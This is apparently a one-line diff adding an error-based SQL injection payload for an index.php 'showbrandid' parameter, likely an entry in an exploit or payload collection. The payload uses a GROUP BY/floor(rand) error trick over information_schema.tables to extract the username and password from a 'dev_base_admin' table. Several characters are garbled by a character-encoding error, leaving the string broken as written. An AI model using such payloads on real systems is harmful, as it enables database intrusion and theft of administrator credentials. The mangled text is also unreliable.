@@ -1,0 +1,1 @@
+/index.php?showbrandid=0¡ä AND (SELECT 1 FROM (SELECT count( * ) , concat((SELECT concat( 0¡Á23, user, 0x7e,password, 0¡Á23 ) FROM dev_base_admin limit 0,1),floor( rand( 0 ) *2 ))x FROM information_schema.tables GROUP BY x)a)¨C%20
